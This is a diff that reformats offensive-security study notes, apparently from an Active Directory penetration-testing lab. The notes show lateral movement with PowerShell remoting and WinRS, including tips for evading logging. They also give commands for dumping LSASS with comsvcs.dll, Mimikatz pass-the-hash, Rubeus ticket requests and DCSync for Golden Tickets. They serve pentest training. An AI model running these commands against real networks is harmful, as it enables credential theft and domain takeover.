@@ -27,10 +27,13 @@ PowerShell Remoting is the modern, "native" way to manage Windows. Unlike older 
 ### **Technique A: One-to-One (PSSession)**
 
 **Concept:** Stateful, Interactive. Think of it like SSH. You connect, the session stays open, and variables are saved.
+
 **Double Hop Problem:** If you PSRemote into `Server A`, and then try to copy a file from `Server B`, it will fail.
+   
     **Why?** `Server A` cannot pass your credentials to `Server B` ("Double Hop") unless specific delegation settings (CredSSP/Unconstrained) are enabled.
 
 **Command:**
+    
     ```
     # Create a persistent session variable
     $sess = New-PSSession -ComputerName dcorp-adminsrv.dollarcorp.moneycorp.local
@@ -40,14 +43,18 @@ PowerShell Remoting is the modern, "native" way to manage Windows. Unlike older 
     
 ### **Technique B: One-to-Many (Invoke-Command)**
 **Concept:** Stateless, Parallel. You send a "Script Block" (a chunk of code) to the target. The target executes it and sends back the text output.
+
 **Power:** This is the most efficient way to hunt. You can ask 100 servers "Is the Domain Admin logged in?" simultaneously.
+
 **Command:**
+   
     ```
     # Execute a block of code on a list of servers
     Invoke-Command -ComputerName (Get-Content servers.txt) -ScriptBlock { Get-Process lsass }
     ```
     
 **Fileless Execution:**
+    
     ```powershell
     # Loads local script into remote memory. No file drops on target disk.
     Invoke-Command -FilePath C:\Tools\Enum.ps1 -ComputerName target-server
@@ -63,6 +70,7 @@ PowerShell Remoting is the modern, "native" way to manage Windows. Unlike older 
 **The Evasion:** PowerShell Remoting creates heavy **Script Block Logs** (Event ID 4104) and **Module Logs**. WinRS executes commands via `cmd.exe` over WinRM, which often bypasses these specific PowerShell logging mechanisms.
 
 **Usage:**
+    
     ```
     winrs -r:dcorp-adminsrv cmd
     ```
@@ -93,9 +101,12 @@ Once you land on a box, you need to "live off the land" or bring tools to steal 
     `sekurlsa::ekeys` (Dumps AES/DES keys for tickets).
 2.  **SafetyKatz:** Dumps LSASS memory to a temp file, then runs Mimikatz on the file. This prevents Mimikatz from interacting directly with the live LSASS process (which crashes less often).
 3.  **Dumpert / Comsvcs.dll:** "Living off the Land". Uses built-in Windows DLLs to create a dump file.
+
     **Mechanism:** `comsvcs.dll` has a function `MiniDump` intended for debugging. Attackers abuse it.
+
     **Command:**
-        ```
+
+      ```
         rundll32.exe C:\windows\System32\comsvcs.dll, MiniDump <LSASS_PID> C:\Temp\lsass.dmp full
         ```
 
@@ -113,6 +124,7 @@ You have the credentials. Now, how do you use them?
 **Limitation:** You typically cannot access services that *require* Kerberos (like some SQL configs or file shares with specific policies) or machines in "Protected Users" groups.
 
 **Command:**
+   
     ```
     # Spawns a new PowerShell window authenticated as the target
     Invoke-Mimikatz -Command '"sekurlsa::pth /user:Admin /domain:target /ntlm:<HASH> /run:powershell.exe"'
@@ -129,6 +141,7 @@ You have the credentials. Now, how do you use them?
 **OpSec Note:** Always use **AES256 keys** if possible. Using NTLM (RC4) to request a TGT is a deprecated behavior that modern SOCs flag immediately.
 
 **Command (Rubeus):**
+   
     ```
     # Requests TGT using AES Key and caches it in the current session
     Rubeus.exe asktgt /user:admin /aes256:<KEY> /opsec /ptt
@@ -147,6 +160,7 @@ DCSync is not an exploit; it is a feature abuse. It uses the **DRS (Directory Re
 
 ### **The Targets**
 **KRBTGT:** The account that signs all Kerberos tickets. Dumping this allows **Golden Tickets**.
+
 **Specific Users:** Dumping the hash of a CEO or Admin without touching their laptop.
 
 ---
@@ -157,7 +171,9 @@ If you are attacking from a Linux machine (like Kali), you cannot use PowerShell
 
 ### **wmiexec.py (The Stealthy Choice)**
 **Mechanism:** Uses WMI (Windows Management Instrumentation) (Port 135/445).
+
 **How:** It executes commands via DCOM, redirects output to a temp file on the target, reads the file, and deletes it.
+
 **Pros:** Very stealthy; doesn't drop binaries.
 
 ### **psexec.py (The Reliable Choice)**
